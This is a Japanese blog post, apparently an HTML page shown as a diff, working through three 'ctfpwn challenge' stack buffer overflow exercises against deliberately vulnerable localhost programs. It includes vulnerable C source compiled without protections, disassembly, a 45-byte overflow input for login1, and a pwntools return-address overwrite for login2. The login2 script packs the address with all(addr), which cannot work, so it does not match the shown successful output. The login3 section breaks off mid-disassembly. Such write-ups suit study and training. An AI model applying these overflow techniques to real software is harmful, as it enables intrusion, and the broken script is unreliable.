@@ -1,0 +1,395 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>ctfpwn challenge - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="ctfpwn challengeを解いていきます。解けなくても解法はまとめます。
+login1 調査 IDとPasswordを入力させて、認証を行うプログラムが与えられる。
+# nc localhost 10001 ID: hoge Password: huga Invalid ID or password // gcc login1.c -o login1 -fno-stack-protector -no-pie -fcf-protection=none #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> char flag[0x20]; char *gets(char *s); void setup() { FILE *f = NULL; alarm(60); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); f = fopen(&#34;flag.txt&#34;, &#34;rt&#34;); if (f == NULL) { printf(&#34;Failed to read flag."><meta property="og:image" content><meta property="og:title" content="ctfpwn challenge"><meta property="og:description" content="ctfpwn challengeを解いていきます。解けなくても解法はまとめます。
+login1 調査 IDとPasswordを入力させて、認証を行うプログラムが与えられる。
+# nc localhost 10001 ID: hoge Password: huga Invalid ID or password // gcc login1.c -o login1 -fno-stack-protector -no-pie -fcf-protection=none #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> char flag[0x20]; char *gets(char *s); void setup() { FILE *f = NULL; alarm(60); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); f = fopen(&#34;flag.txt&#34;, &#34;rt&#34;); if (f == NULL) { printf(&#34;Failed to read flag."><meta property="og:type" content="article"><meta property="og:url" content="/posts/38/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-07T10:36:01+09:00"><meta property="article:modified_time" content="2023-07-07T10:36:01+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="ctfpwn challenge"><meta name=twitter:description content="ctfpwn challengeを解いていきます。解けなくても解法はまとめます。
+login1 調査 IDとPasswordを入力させて、認証を行うプログラムが与えられる。
+# nc localhost 10001 ID: hoge Password: huga Invalid ID or password // gcc login1.c -o login1 -fno-stack-protector -no-pie -fcf-protection=none #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> char flag[0x20]; char *gets(char *s); void setup() { FILE *f = NULL; alarm(60); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); f = fopen(&#34;flag.txt&#34;, &#34;rt&#34;); if (f == NULL) { printf(&#34;Failed to read flag."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>ctfpwn challenge</h1><div class=meta>Posted on Jul 7, 2023</div></div><nav id=TableOfContents><ol><li><a href=#login1>login1</a><ol><li><a href=#調査>調査</a></li><li><a href=#エクスプロイト>エクスプロイト</a></li></ol></li><li><a href=#login2>login2</a><ol><li><a href=#調査-1>調査</a></li><li><a href=#エクスプロイト-1>エクスプロイト</a></li></ol></li><li><a href=#login3>login3</a><ol><li><a href=#調査-2>調査</a></li><li><a href=#エクスプロイト-2>エクスプロイト</a></li></ol></li></ol></nav><section class=body><p><a href=https://github.com/kusano/ctfpwn_challenge>ctfpwn challenge</a>を解いていきます。解けなくても解法はまとめます。</p><h1 id=login1>login1</h1><h2 id=調査>調査</h2><p>IDとPasswordを入力させて、認証を行うプログラムが与えられる。</p><pre tabindex=0><code># nc localhost 10001
+ID: hoge
+Password: huga
+Invalid ID or password
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.c data-lang=:.c><span style=display:flex><span><span style=color:#75715e>//  gcc login1.c -o login1 -fno-stack-protector -no-pie -fcf-protection=none
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> flag[<span style=color:#ae81ff>0x20</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gets</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>s);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setup</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> NULL;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>alarm</span>(<span style=color:#ae81ff>60</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setvbuf</span>(stdin, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setvbuf</span>(stdout, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setvbuf</span>(stderr, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    f <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;flag.txt&#34;</span>, <span style=color:#e6db74>&#34;rt&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (f <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Failed to read flag.txt</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fscanf</span>(f, <span style=color:#e6db74>&#34;%s&#34;</span>, flag);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fclose</span>(f);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> id[<span style=color:#ae81ff>0x20</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> password[<span style=color:#ae81ff>0x20</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> ok <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setup</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;ID: &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>gets</span>(id);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Password: &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>gets</span>(password);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(id, <span style=color:#e6db74>&#34;admin&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>strcmp</span>(password, flag) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        ok <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (ok) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Login Succeeded</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;The flag is: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, flag);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Invalid ID or password</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><code>id</code>と<code>password</code>がgets関数を用いて読み込まれる。gets関数は読み込み先の配列サイズを指定できないため、バッファオーバーフロー脆弱性が存在する。</p><p>objdumpで逆アセンブルしてみる。</p><pre tabindex=0><code># objdump --no-show-raw-insn -M intel -d login1
+000000000040128c &lt;main&gt;:
+...
+4012f6:       lea    rax,[rbp-0x30]
+4012fa:       mov    rdi,rax
+4012fd:       call   401090 &lt;gets@plt&gt;
+...
+401313:       lea    rax,[rbp-0x50]
+401317:       mov    rdi,rax
+40131a:       call   401090 &lt;gets@plt&gt;
+...
+401354:       cmp    DWORD PTR [rbp-0x4],0x0
+401358:       je     401380 &lt;main+0xf4&gt;
+</code></pre><p>スタックの中身はこうなっている。</p><table><thead><tr><th>アドレス</th><th>サイズ</th><th>内容</th></tr></thead><tbody><tr><td>rbp-0x50</td><td>0x20</td><td>password</td></tr><tr><td>rbp-0x30</td><td>0x20</td><td>id</td></tr><tr><td>rbp-0x10</td><td>0x0c</td><td>未使用</td></tr><tr><td>rbp-0x4</td><td>0x04</td><td>ok</td></tr></tbody></table><h2 id=エクスプロイト>エクスプロイト</h2><p>IDに0x2c(=44)バイトより長い文字列を入力することで<code>ok</code>を書き換えることができる。</p><pre tabindex=0><code># python3 -c &#34;print(&#39;a&#39;*45)&#34;
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+# nc localhost 10001
+ID: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Password: hoge
+Login Succeeded
+The flag is: FLAG{58fd7d9bMJNTjnv5}
+</code></pre><h1 id=login2>login2</h1><h2 id=調査-1>調査</h2><p>ソースコードは以下。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.c data-lang=:.c><span style=display:flex><span><span style=color:#75715e>//  gcc login2.c -o login2 -fno-stack-protector -no-pie -fcf-protection=none
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> flag[<span style=color:#ae81ff>0x20</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gets</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>s);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setup</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> NULL;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>alarm</span>(<span style=color:#ae81ff>60</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setvbuf</span>(stdin, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setvbuf</span>(stdout, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setvbuf</span>(stderr, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    f <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;flag.txt&#34;</span>, <span style=color:#e6db74>&#34;rt&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (f <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Failed to read flag.txt</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fscanf</span>(f, <span style=color:#e6db74>&#34;%s&#34;</span>, flag);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fclose</span>(f);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> id[<span style=color:#ae81ff>0x20</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> password[<span style=color:#ae81ff>0x20</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setup</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;ID: &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>gets</span>(id);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Password: &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>gets</span>(password);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(id, <span style=color:#e6db74>&#34;admin&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>strcmp</span>(password, flag) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Login Succeeded</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;The flag is: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, flag);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Invalid ID or password</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>login1との差分として、ok変数が消えている。</p><p>gdb(gdb-peda)を用いてmain関数のディスアセンブルを行う。</p><pre tabindex=0><code># gdb -q login2
+Reading symbols from login2...
+(No debugging symbols found in login2)
+gdb-peda$ disassemble main
+Dump of assembler code for function main:
+   0x000000000040128c &lt;+0&gt;:     push   rbp
+   0x000000000040128d &lt;+1&gt;:     mov    rbp,rsp
+   0x0000000000401290 &lt;+4&gt;:     sub    rsp,0x40
+   0x0000000000401294 &lt;+8&gt;:     mov    QWORD PTR [rbp-0x20],0x0
+   0x000000000040129c &lt;+16&gt;:    mov    QWORD PTR [rbp-0x18],0x0
+   0x00000000004012a4 &lt;+24&gt;:    mov    QWORD PTR [rbp-0x10],0x0
+   0x00000000004012ac &lt;+32&gt;:    mov    QWORD PTR [rbp-0x8],0x0
+   0x00000000004012b4 &lt;+40&gt;:    mov    QWORD PTR [rbp-0x40],0x0
+   0x00000000004012bc &lt;+48&gt;:    mov    QWORD PTR [rbp-0x38],0x0
+   0x00000000004012c4 &lt;+56&gt;:    mov    QWORD PTR [rbp-0x30],0x0
+   0x00000000004012cc &lt;+64&gt;:    mov    QWORD PTR [rbp-0x28],0x0
+   0x00000000004012d4 &lt;+72&gt;:    mov    eax,0x0
+   0x00000000004012d9 &lt;+77&gt;:    call   0x4011b6 &lt;setup&gt;
+   0x00000000004012de &lt;+82&gt;:    lea    rdi,[rip+0xd46]        # 0x40202b
+   0x00000000004012e5 &lt;+89&gt;:    mov    eax,0x0
+   0x00000000004012ea &lt;+94&gt;:    call   0x401060 &lt;printf@plt&gt;
+   0x00000000004012ef &lt;+99&gt;:    lea    rax,[rbp-0x20]
+   0x00000000004012f3 &lt;+103&gt;:   mov    rdi,rax
+   0x00000000004012f6 &lt;+106&gt;:   call   0x401090 &lt;gets@plt&gt;
+   0x00000000004012fb &lt;+111&gt;:   lea    rdi,[rip+0xd2e]        # 0x402030
+   0x0000000000401302 &lt;+118&gt;:   mov    eax,0x0
+   0x0000000000401307 &lt;+123&gt;:   call   0x401060 &lt;printf@plt&gt;
+   0x000000000040130c &lt;+128&gt;:   lea    rax,[rbp-0x40]
+   0x0000000000401310 &lt;+132&gt;:   mov    rdi,rax
+   0x0000000000401313 &lt;+135&gt;:   call   0x401090 &lt;gets@plt&gt;
+   0x0000000000401318 &lt;+140&gt;:   lea    rax,[rbp-0x20]
+   0x000000000040131c &lt;+144&gt;:   lea    rsi,[rip+0xd18]        # 0x40203b
+   0x0000000000401323 &lt;+151&gt;:   mov    rdi,rax
+   0x0000000000401326 &lt;+154&gt;:   call   0x401080 &lt;strcmp@plt&gt;
+   0x000000000040132b &lt;+159&gt;:   test   eax,eax
+   0x000000000040132d &lt;+161&gt;:   jne    0x40136c &lt;main+224&gt;
+   0x000000000040132f &lt;+163&gt;:   lea    rax,[rbp-0x40]
+   0x0000000000401333 &lt;+167&gt;:   lea    rsi,[rip+0x2d86]        # 0x4040c0 &lt;flag&gt;
+   0x000000000040133a &lt;+174&gt;:   mov    rdi,rax
+   0x000000000040133d &lt;+177&gt;:   call   0x401080 &lt;strcmp@plt&gt;
+   0x0000000000401342 &lt;+182&gt;:   test   eax,eax
+   0x0000000000401344 &lt;+184&gt;:   jne    0x40136c &lt;main+224&gt;
+   0x0000000000401346 &lt;+186&gt;:   lea    rdi,[rip+0xcf4]        # 0x402041
+   0x000000000040134d &lt;+193&gt;:   call   0x401040 &lt;puts@plt&gt;
+   0x0000000000401352 &lt;+198&gt;:   lea    rsi,[rip+0x2d67]        # 0x4040c0 &lt;flag&gt;
+   0x0000000000401359 &lt;+205&gt;:   lea    rdi,[rip+0xcf1]        # 0x402051
+   0x0000000000401360 &lt;+212&gt;:   mov    eax,0x0
+   0x0000000000401365 &lt;+217&gt;:   call   0x401060 &lt;printf@plt&gt;
+   0x000000000040136a &lt;+222&gt;:   jmp    0x401378 &lt;main+236&gt;
+   0x000000000040136c &lt;+224&gt;:   lea    rdi,[rip+0xcef]        # 0x402062
+   0x0000000000401373 &lt;+231&gt;:   call   0x401040 &lt;puts@plt&gt;
+   0x0000000000401378 &lt;+236&gt;:   mov    eax,0x0
+   0x000000000040137d &lt;+241&gt;:   leave  
+   0x000000000040137e &lt;+242&gt;:   ret    
+</code></pre><p>main関数終了時のret命令を用いて実行されるアドレスを書き換えることを行う。login1と変わらず、<code>id</code>と<code>password</code>がgets関数を用いて読み込まれるため、バッファオーバーフローによってスタックを書き換えることが可能。<code>ok</code>変数が消えたのみなのでスタックの中身は以下のようになる。main関数実行時に<code>sub rsp,0x40</code>を実行し0x40分だけスタックを確保しており、login1の時にあった謎の未使用領域がなくなっている（login1の時は0x50分スタックを確保していた）。</p><table><thead><tr><th>アドレス</th><th>サイズ</th><th>内容</th></tr></thead><tbody><tr><td>rbp-0x40</td><td>0x20</td><td>password</td></tr><tr><td>rbp-0x20</td><td>0x20</td><td>id</td></tr><tr><td>rbp</td><td>0x08</td><td>rbp</td></tr><tr><td>rbp+0x08</td><td>0x08</td><td>リターンアドレス</td></tr></tbody></table><p>以下からリターンアドレスを<code>0x401346</code>に書き換えることで、<code>id</code>と<code>password</code>照合後の<code>printf("Login Succeeded\n");</code>から処理が実行される。</p><pre tabindex=0><code>0x0000000000401346 &lt;+186&gt;:   lea    rdi,[rip+0xcf4]        # 0x402041
+0x000000000040134d &lt;+193&gt;:   call   0x401040 &lt;puts@plt&gt;
+</code></pre><h2 id=エクスプロイト-1>エクスプロイト</h2><p>48バイト適当に文字を送信した後に、リターンアドレス書き換え用のアドレスを送信する。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> struct <span style=color:#f92672>import</span> pack
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401346</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;localhost&#39;</span>, <span style=color:#ae81ff>10002</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x48</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> all(addr)
+</span></span><span style=display:flex><span>print(io<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;ID: &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>print(io<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Password: &#34;</span>, payload))
+</span></span><span style=display:flex><span>print(io<span style=color:#f92672>.</span>recv())
+</span></span></code></pre></div><pre tabindex=0><code># python3 solver.py 
+[+] Opening connection to localhost on port 10002: Done
+b&#39;ID: &#39;
+b&#39;Password: &#39;
+b&#39;Invalid ID or password\nLogin Succeeded\nThe flag is: FLAG{IxhH3hu2QZm9zOFu}\n&#39;
+[*] Closed connection to localhost port 10002
+</code></pre><h1 id=login3>login3</h1><h2 id=調査-2>調査</h2><p><code>admin</code>を入力すると<code>Login Succeeded</code>と出力されるが、flagは表示されない。</p><pre tabindex=0><code># nc localhost 10003
+ID: hoge
+Invalid ID
+# nc localhost 10003
+ID: admin
+Login Succeeded
+</code></pre><p>ソースコードは以下。flagが読み込まれていないため、シェルを取得することでflagを取る問題だと予想される。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.c data-lang=:.c><span style=display:flex><span><span style=color:#75715e>//  gcc login3.c -o login3 -fno-stack-protector -no-pie -fcf-protection=none
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gets</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>s);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setup</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>alarm</span>(<span style=color:#ae81ff>60</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setvbuf</span>(stdin, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setvbuf</span>(stdout, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setvbuf</span>(stderr, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> id[<span style=color:#ae81ff>0x20</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setup</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;ID: &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>gets</span>(id);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(id, <span style=color:#e6db74>&#34;admin&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Login Succeeded</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Invalid ID</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>以下、main関数を逆アセンブリしたもの。</p><pre tabindex=0><code>gdb-peda$ disassemble main
+Dump of assembler code for function main:
+   0x00000000004011e1 &lt;+0&gt;:     push   rbp
+   0x00000000004011e2 &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000004011e5 &lt;+4&gt;:     sub    rsp,0x20
+   0x00000000004011e9 &lt;+8&gt;:     mov    QWORD PTR [rbp-0x20],0x0
+   0x00000000004011f1 &lt;+16&gt;:    mov    QWORD PTR [rbp-0x18],0x0
+   0x00000000004011f9 &lt;+24&gt;:    mov    QWORD PTR [rbp-0x10],0x0
+   0x0000000000401201 &lt;+32&gt;:    mov    QWORD PTR [rbp-0x8],0x0
+   0x0000000000401209 &lt;+40&gt;:    mov    eax,0x0
+   0x000000000040120e &lt;+45&gt;:    call   0x401176 &lt;setup&gt;
+   0x0000000000401213 &lt;+50&gt;:    lea    rdi,[rip+0xdea]        # 0x402004
+   0x000000000040121a &lt;+57&gt;:    mov    eax,0x0
+   0x000000000040121f &lt;+62&gt;:    call   0x401040 &lt;printf@plt&gt;
+   0x0000000000401224 &lt;+67&gt;:    lea    rax,[rbp-0x20]
+   0x0000000000401228 &lt;+71&gt;:    mov    rdi,rax
+   0x000000000040122b &lt;+74&gt;:    call   0x401070 &lt;gets@plt&gt;
+   0x0000000000401230 &lt;+79&gt;:    lea    rax,[rbp-0x20]
+   0x0000000000401234 &lt;+83&gt;:    lea    rsi,[rip+0xdce]        # 0x402009
+   0x000000000040123b &lt;+90&gt;:    mov    rdi,rax
+   0x000000000040123e &lt;+93&gt;:    call   0x401060 &lt;strcmp@plt&gt;
+   0x0000000000401243 &lt;+98&gt;:    test   eax,eax
